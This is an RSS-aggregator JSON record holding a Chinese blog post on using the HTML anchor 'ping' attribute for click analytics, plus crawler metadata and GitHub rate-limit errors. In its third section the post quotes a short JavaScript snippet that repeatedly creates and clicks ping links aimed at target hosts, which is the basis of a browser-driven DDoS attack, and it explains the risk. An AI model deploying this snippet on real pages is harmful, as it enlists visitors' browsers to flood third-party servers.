{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2021-09-28 21:25:42","updatedTime":"2021-09-28 21:25:42","title":"借助HTML ping属性实现数据上报","link":"https://www.zhangxinxu.com/wordpress/?p=10110","description":"<p>by <a href=\"https://www.zhangxinxu.com/\">zhangxinxu</a> from <a href=\"https://www.zhangxinxu.com/wordpress/?p=10110\">https://www.zhangxinxu.com/wordpress/?p=10110</a> 鑫空间-鑫生活<br /> 本文欢迎分享与聚合，全文转载就不必了，尊重版权，圈子就这么大，若急用可以联系授权。</p> \n<p><script>window.wxShareImgUrl = 'https://www.zhangxinxu.com/study/image/share/202109-ping.png';if(!/zhangxinxu/.test(location.host)){document.body.addEventListener('mousedown',function(){location.href='https://www.zhangxinxu.com/wordpress/?p=10110'});}</script></p> \n<p><img src=\"https://image.zhangxinxu.com/image/blog/202109/ping-cover.png\" width=\"480\" height=\"310\" alt=\"ping文章封面\" class=\"alignnone clip thumb size-medium\" /></p> \n<h3>一、温故知新之CSS上报</h3> \n<p>几年前有介绍过<a href=\"https://www.zhangxinxu.com/wordpress/2018/12/css-data-report-html-validate/\">使用 CSS 实现数据上报</a>：</p> \n<pre>.button-1:active::after {\n    content: url(./pixel.gif?action=click&amp;id=button1);\n    display: none;\n}\n.button-2:active::after {\n    content: url(./pixel.gif?action=click&amp;id=button2);\n    display: none;\n}</pre> \n<p>不过上报地址写在 CSS 中不太好维护，我们可以使用 CSS 变量优化下：</p> \n<pre>.report:active::after {\n    content: var(--report);\n    display: inline-block;\n    position: absolute;\n}</pre> \n<p>此时，凡事设置了类名 <code>.report</code> 的元素按下的时候都会上报，例如：</p> \n<pre is-wrap=\"\">&lt;button class=\"report\" style=\"--report:url(./pixel.gif?action=click&amp;id=button1)\"&gt;按钮1&lt;/button&gt;\n&lt;button class=\"report\" style=\"--report:url(./pixel.gif?action=click&amp;id=button2)\" &gt;按钮2&lt;/button&gt;</pre> \n<p>此时点击这两个按钮就可以看到如下所示的请求：</p> \n<p><img src=\"https://image.zhangxinxu.com/image/blog/201812/2018-12-03_235450.png\" width=\"571\" height=\"250\" alt=\"CSS统计点击行为截图\" class=\"alignnone size-medium\" /></p> \n<p>眼见为实，您可以狠狠地点击这里：<a href=\"https://www.zhangxinxu.com/study/202109/css-var-report-demo.php\" rel=\"noopener\" target=\"_blank\">CSS 变量与 :active 数据上报 demo</a></p> \n<p>然后，最近发现，原来浏览器有个 HTML 属性原生就支持数据上报的。</p> \n<p><span class=\"hidden\">//zxx: 如果你看到这段文字，说明你现在访问是体验糟糕的垃圾盗版网站，你可以访问原文获得很好的体验：https://www.zhangxinxu.com/wordpress/?p=10110（作者张鑫旭）</span></p> \n<h3>二、ping 属性与数据上报</h3> \n<p>对于 <code>&lt;a&gt;</code> 链接元素，存在一个很多人不知道的属性—— <code>ping</code> 属性，只要设置了 <code>ping</code> 属性，用户点击此链接元素的时候，浏览器就会自动发送一个 POST 请求给 <code>ping</code> 属性值地址。</p> \n<p>例如，页面中有如下 HTML 代码：</p> \n<pre is-wrap=\"\">&lt;a href ping=\"/pixel.gif?action=click&amp;id=link1\"&gt;链接1&lt;/a&gt;\n&lt;a href ping=\"/pixel.gif?action=click&amp;id=link2\"&gt;链接2&lt;/a&gt;</pre> \n<p>此时，点击“链接1”和“链接2”，浏览器就会给服务器 POST <code>'/pixel.gif...'</code>这个地址。</p> \n<p>我专门做了个的demo，您可以狠狠地点击这里：<a href=\"https://www.zhangxinxu.com/study/202109/html-ping-report-demo.php\" rel=\"noopener\" target=\"_blank\">HTML ping 属性与数据上报 demo</a></p> \n<p>打开上述页面的控制台，切换到网络面板，然后点击页面中的两个链接元素（如下图所示）：</p> \n<p><img src=\"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_113730.png\" width=\"402\" height=\"201\" alt=\"链接点击截图\" class=\"alignnone size-medium\" /></p> \n<p>此时就可以看到 POST 请求发出了，如下截图所示：</p> \n<p><img src=\"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_113947.png\" width=\"586\" height=\"226\" alt=\"post请求一张图片示意\" class=\"alignnone size-medium\" /></p> \n<p>不过 405 了，因为图片无法接受 POST 请求，被服务器阻止了，实际开发肯定会使用一个专门接受 POST 数据的地址。</p> \n<p>虽然请求被阻止，但是请求头信息依然可见，我们看一下：</p> \n<p><img src=\"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_142015.png\" width=\"542\" height=\"631\" alt=\"请求头信息\" class=\"alignnone size-medium\" /></p> \n<p>可以看到 ping 请求的 content-type 是 text/ping，包含了用户的 User-Agent，是否跨域，目标来源地址等信息，非常方便数据收集的时候进行追踪。</p> \n<h4>ping 属性的优势</h4> \n<p>使用 <code>ping</code> 属性实现数据上报的优点如下：</p> \n<ol> \n <li>无需 JavaScript 代码参与，网页功能异常也能上报；</li> \n <li>不受浏览器刷新、跳转过关闭影响，也不会阻塞页面后续行为，这一点和 <code>navigator.sendBeacon()</code> 类似，可以保证数据上报的准确性；</li> \n <li>支持跨域； <pre>&lt;a href=\"https://www.zhangxinxu.com/\" \n  ping=\"https://www.canvasapi.cn/notify.php\"&gt;点击我&lt;/a&gt;</pre> </li> \n <li>可上报大量数据，因为是 POST 请求；</li> \n <li>语义明确，使用方便，灵活自主。</li> \n</ol> \n<h4>ping 属性的劣势</h4> \n<p>ping 属性的不足也是很明显的。</p> \n<ul> \n <li>只能支持点击行为的上报，如果是进入视区，或弹框显示的上报，需要额外触发下元素的 <code>click()</code> 行为；</li> \n <li>只能支持 <code>&lt;a&gt;</code> 元素，在其他元素上设置 ping 属性没有作用，这就限制了其使用范围，因为很多开发喜欢 div 一把梭。</li> \n <li>只能是 POST 请求，目前主流的数据统计还是日志中的 GET 请求，不能复用现有的基建。</li> \n <li>出生不好，身为 HTML 属性，天然受某些开发者无视与不屑。</li> \n <li>适合在移动端项目使用，PC端需要酌情使用（不需要考虑上报总量的情况下），因为目前 IE 和 Firefox 浏览器都不支持（或没有默认开启支持）。 <p><img src=\"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_154852.png\" width=\"640\" height=\"324\" alt=\"ping 属性的兼容性\" class=\"alignnone size-medium\" /></p></li> \n</ul> \n<h3>三、Ping 属性与 DDoS 攻击</h3> \n<p>既然点击链接的同时会发送一个 POST 请求，那么 ping 属性可以做的事情肯定不仅仅是上报。</p> \n<p>其实，从数年前开始就有人利用 ping 属性发起 DDoS 攻击，<a href=\"https://www.imperva.com/blog/the-ping-is-the-thing-popular-html5-feature-used-to-trick-chinese-mobile-users-into-joining-latest-ddos-attack/\" rel=\"noopener nofollow\" target=\"_blank\">这篇文章</a>有介绍。</p> \n<p>攻击代码如下：</p> \n<pre>var arr = ['https://www.exampe1.com', 'https://www.exampe2.com', 'https://www.exampe3.com'];\nfunction yzk( ){\n    var indexarr = Math.floor((Math.random( )*arr.length));\n    document.writeln(\"&lt;script&gt;var link = document.createElement(\\'a\\');link.href=\\'\\';link.ping=\\'\"+\n        arr[indexarr] +\n    \"\\';document.head.appendChild(link); link.click();&lt;/script&gt;\");\n}\n\nif(arr.length&gt;0){\n    var ytimename = setlnterval(\"yzk()\", 1000);\n}\n</pre> \n<p>创建一个 <code>&lt;a&gt;</code> 元素，设置 ping 地址，触发此链接元素的 <code>click()</code> 事件，此时就可以对目标服务器发动请求攻击了，不停地定时请求攻击。</p> \n<p>例如，很多网站会使用开源的第三方 CDN 服务，要是哪天这些第三方的 JS 里面搞点什么，弄个 DDoS 攻击什么的，那是很Easy的，且威力会非常惊人。</p> \n<h3>四、评价一下</h3> \n<p>ping 属性上报尤其独到之处，可以用到需要精确知道数据，但是不需要那么广泛或大规模的场景。</p> \n<p>例如 AB 测试就非常合适。</p> \n<p>同样两个广告图，各自 50% 显示，分别预埋 ping 属性，然后处理 POST 请求，就能快速知道哪个广告图的点击效果好了，不需要经过大数据，前端自己就能搞定这个事情，比较容易出绩效。</p> \n<p>相当于一个低成本的杠杆，由于成本低，日后调转船头也会非常方便。</p> \n<p>如果是复杂的大规模的系统上报，则 ping 属性方法并不合适，还是使用传统的 JavaScript 发送请求的方式吧。</p> \n<p>好，以上就是本文的内容。</p> \n<h4>其他</h4> \n<p>昨晚花了几个小时把代码显示美化了下，如果有人喜欢传统的有的放矢的高亮，可以点击右上角按钮进行还原，同时增加了一键复制代码的功能。</p> \n<p>还有人反馈我的网站丑，丑吗？我问了下家里的领导，领导呵呵笑了笑，欲言又止。</p> \n<p>行，我懂了！</p> \n<p>有没有谁有兴趣在不大改的前提下提升下站点的视觉体验的，最好出个figma视觉稿，意见采纳者我会送一本签名版的《CSS新世界》，价值128元。</p> \n<p><img src=\"https://image.zhangxinxu.com/image/blog/202109/where-ur.png\" width=\"180\" height=\"171\" alt=\"你在哪里？\" class=\"alignnone size-medium\" /></p> \n<p>本文为原创文章，欢迎分享，勿全文转载，如果实在喜欢，可收藏，永不过期，且会及时更新知识点及修正错误，阅读体验也更好。<br /> 本文地址：<a href=\"https://www.zhangxinxu.com/wordpress/?p=10110\">https://www.zhangxinxu.com/wordpress/?p=10110</a></p> \n<p>（本篇完）</p>","descriptionType":"html","publishedDate":"Tue, 14 Sep 2021 08:02:05 +0000","feedId":23446,"bgimg":"https://image.zhangxinxu.com/image/blog/202109/ping-cover.png","linkMd5":"1438a443657e70655c14a73d55240864","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn65@2020_3/2021/09/28/13-25-47-157_82c412626e0f8d94.webp","destWidth":480,"destHeight":310,"sourceBytes":24522,"destBytes":5540,"author":"张 鑫旭","articleImgCdnMap":{"https://image.zhangxinxu.com/image/blog/202109/ping-cover.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn65@2020_3/2021/09/28/13-25-47-157_82c412626e0f8d94.webp","https://image.zhangxinxu.com/image/blog/201812/2018-12-03_235450.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn89@2020_6/2021/09/28/13-26-49-231_bad1790701f62a3d.webp","https://image.zhangxinxu.com/image/blog/202109/2021-09-14_113730.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn70@2020_4/2021/09/28/13-25-50-122_1c386bd20c025f45.webp","https://image.zhangxinxu.com/image/blog/202109/2021-09-14_113947.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn72@2020_1/2021/09/28/13-25-49-491_03be18fe868a90c2.webp","https://image.zhangxinxu.com/image/blog/202109/2021-09-14_142015.png":null,"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_154852.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn81@2020_6/2021/09/28/13-25-49-845_adbf86914e2ffffb.webp","https://image.zhangxinxu.com/image/blog/202109/where-ur.png":null},"publishedOrCreatedDate":1632835542842}],"record":{"createdTime":"2021-09-28 21:25:42","updatedTime":"2021-09-28 21:25:42","feedId":23446,"fetchDate":"Tue, 28 Sep 2021 13:25:42 +0000","fetchMs":2196,"handleMs":11,"totalMs":69318,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"245d88d7b2d8f26704713c23b090d029","hostName":"us-020*","requestId":"283e0726883f461197694b8fa84bba1d_23446","contentType":"application/rss+xml; charset=UTF-8","totalBytes":70122,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":7,"articlesImgsGithubTotal":5,"successGithubMap":{"myreaderx8":1,"myreaderx2":1,"myreaderx13":1,"myreaderx30":1,"myreaderx29":1},"failGithubMap":{"myreaderx14":1,"myreaderx23":1}},"feed":{"createdTime":"2020-09-07 02:30:26","updatedTime":"2020-09-07 04:23:12","id":23446,"name":"张鑫旭-鑫空间-鑫生活","url":"https://www.zhangxinxu.com/wordpress/feed/","subscriber":140,"website":null,"icon":"https://www.zhangxinxu.com/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx65/cdn55@2020_5/2020/09/06/20-23-07-457_9a339309f46b07b8.ico","description":"提高前端技术，先从使用谷歌搜索做起","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2021-09-28 21:26:49","updatedTime":"2021-09-28 21:26:49","id":null,"feedId":23446,"linkMd5":"1438a443657e70655c14a73d55240864"}],"tmpCommonImgCdnBytes":5540,"tmpBodyImgCdnBytes":64582,"tmpBgImgCdnBytes":0,"extra4":{"start":1632835540169,"total":0,"statList":[{"spend":2663,"msg":"获取xml内容"},{"spend":11,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":61888,"msg":"正文链接上传到cdn"}]},"extra5":7,"extra6":7,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://image.zhangxinxu.com/image/blog/202109/where-ur.png","sourceStatusCode":200,"destWidth":360,"destHeight":341,"sourceBytes":35313,"destBytes":40812,"targetWebpQuality":75,"feedId":23446,"totalSpendMs":2199,"convertSpendMs":11,"createdTime":"2021-09-28 21:25:47","host":"us-032*","referer":"https://www.zhangxinxu.com/wordpress/?p=10110","linkMd5ListStr":"1438a443657e70655c14a73d55240864","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn86/contents/2021/09/28/13-25-49-768_fbdb35816693f66a.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Tue, 28 Sep 2021 13:25:49 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["BF0C:25F2:8E72:10B2D:615317DD"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1632837896"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["60"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn86/contents/2021/09/28/13-25-49-768_fbdb35816693f66a.webp","historyStatusCode":[],"spendMs":42},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"34.5 KB","destSize":"39.9 KB","compressRate":"115.6%"},{"code":1,"isDone":false,"source":"https://image.zhangxinxu.com/image/blog/202109/where-ur.png","sourceStatusCode":200,"destWidth":360,"destHeight":341,"sourceBytes":35313,"destBytes":40812,"targetWebpQuality":75,"feedId":23446,"totalSpendMs":1356,"convertSpendMs":11,"createdTime":"2021-09-28 21:25:49","host":"us-032*","referer":"https://www.zhangxinxu.com/wordpress/?p=10110","linkMd5ListStr":"1438a443657e70655c14a73d55240864","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn86/contents/2021/09/28/13-25-51-066_fbdb35816693f66a.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Tue, 28 Sep 2021 13:25:51 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["BF0C:25F2:8F2D:10CB1:615317DF"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1632837896"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["60"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn86/contents/2021/09/28/13-25-51-066_fbdb35816693f66a.webp","historyStatusCode":[],"spendMs":104},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"34.5 KB","destSize":"39.9 KB","compressRate":"115.6%"},{"code":1,"isDone":false,"source":"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_142015.png","sourceStatusCode":200,"destWidth":542,"destHeight":631,"sourceBytes":21339,"destBytes":49704,"targetWebpQuality":75,"feedId":23446,"totalSpendMs":3917,"convertSpendMs":14,"createdTime":"2021-09-28 21:25:47","host":"europe66*","referer":"https://www.zhangxinxu.com/wordpress/?p=10110","linkMd5ListStr":"1438a443657e70655c14a73d55240864","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn77/contents/2021/09/28/13-25-51-321_6181adfd2b6d6851.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Tue, 28 Sep 2021 13:25:51 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8F9C:2BF8:D9FE:E12C:615317DF"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1632837892"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["60"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn77/contents/2021/09/28/13-25-51-321_6181adfd2b6d6851.webp","historyStatusCode":[],"spendMs":303},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.8 KB","destSize":"48.5 KB","compressRate":"232.9%"},{"code":1,"isDone":false,"source":"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_142015.png","sourceStatusCode":200,"destWidth":542,"destHeight":631,"sourceBytes":21339,"destBytes":49704,"targetWebpQuality":75,"feedId":23446,"totalSpendMs":1934,"convertSpendMs":13,"createdTime":"2021-09-28 21:25:51","host":"europe66*","referer":"https://www.zhangxinxu.com/wordpress/?p=10110","linkMd5ListStr":"1438a443657e70655c14a73d55240864","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn77/contents/2021/09/28/13-25-53-404_6181adfd2b6d6851.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Tue, 28 Sep 2021 13:25:53 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8F9C:2BF8:DB5D:E28F:615317E1"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1632837892"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["60"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn77/contents/2021/09/28/13-25-53-404_6181adfd2b6d6851.webp","historyStatusCode":[],"spendMs":227},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"20.8 KB","destSize":"48.5 KB","compressRate":"232.9%"},null],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-032.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-54.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-002.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-019.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-003.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe66.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://image.zhangxinxu.com/image/blog/202109/ping-cover.png","sourceStatusCode":200,"destWidth":480,"destHeight":310,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn65@2020_3/2021/09/28/13-25-47-157_82c412626e0f8d94.webp","sourceBytes":24522,"destBytes":5540,"targetWebpQuality":75,"feedId":23446,"totalSpendMs":2852,"convertSpendMs":9,"createdTime":"2021-09-28 21:25:44","host":"us-028*","referer":"https://www.zhangxinxu.com/wordpress/?p=10110","linkMd5ListStr":"1438a443657e70655c14a73d55240864,1438a443657e70655c14a73d55240864","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.9 KB","destSize":"5.4 KB","compressRate":"22.6%"},{"code":1,"isDone":false,"source":"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_113947.png","sourceStatusCode":200,"destWidth":586,"destHeight":226,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn72@2020_1/2021/09/28/13-25-49-491_03be18fe868a90c2.webp","sourceBytes":5978,"destBytes":10444,"targetWebpQuality":75,"feedId":23446,"totalSpendMs":2371,"convertSpendMs":8,"createdTime":"2021-09-28 21:25:47","host":"us-003*","referer":"https://www.zhangxinxu.com/wordpress/?p=10110","linkMd5ListStr":"1438a443657e70655c14a73d55240864","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"5.8 KB","destSize":"10.2 KB","compressRate":"174.7%"},{"code":1,"isDone":false,"source":"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_154852.png","sourceStatusCode":200,"destWidth":640,"destHeight":324,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn81@2020_6/2021/09/28/13-25-49-845_adbf86914e2ffffb.webp","sourceBytes":14392,"destBytes":27130,"targetWebpQuality":75,"feedId":23446,"totalSpendMs":2987,"convertSpendMs":9,"createdTime":"2021-09-28 21:25:47","host":"us-54*","referer":"https://www.zhangxinxu.com/wordpress/?p=10110","linkMd5ListStr":"1438a443657e70655c14a73d55240864","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"14.1 KB","destSize":"26.5 KB","compressRate":"188.5%"},{"code":1,"isDone":false,"source":"https://image.zhangxinxu.com/image/blog/202109/2021-09-14_113730.png","sourceStatusCode":200,"destWidth":402,"destHeight":201,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn70@2020_4/2021/09/28/13-25-50-122_1c386bd20c025f45.webp","sourceBytes":6689,"destBytes":10426,"targetWebpQuality":75,"feedId":23446,"totalSpendMs":3064,"convertSpendMs":12,"createdTime":"2021-09-28 21:25:47","host":"us-002*","referer":"https://www.zhangxinxu.com/wordpress/?p=10110","linkMd5ListStr":"1438a443657e70655c14a73d55240864","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"6.5 KB","destSize":"10.2 KB","compressRate":"155.9%"},{"code":1,"isDone":false,"source":"https://image.zhangxinxu.com/image/blog/201812/2018-12-03_235450.png","sourceStatusCode":200,"destWidth":571,"destHeight":250,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn89@2020_6/2021/09/28/13-26-49-231_bad1790701f62a3d.webp","sourceBytes":9438,"destBytes":16582,"targetWebpQuality":75,"feedId":23446,"totalSpendMs":1727,"convertSpendMs":10,"createdTime":"2021-09-28 21:26:47","host":"us-002*","referer":"https://www.zhangxinxu.com/wordpress/?p=10110","linkMd5ListStr":"1438a443657e70655c14a73d55240864","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"9.2 KB","destSize":"16.2 KB","compressRate":"175.7%"}],"successGithubMap":{"myreaderx8":1,"myreaderx2":1,"myreaderx13":1,"myreaderx30":1,"myreaderx29":1},"failGithubMap":{"myreaderx14":1,"myreaderx23":1}}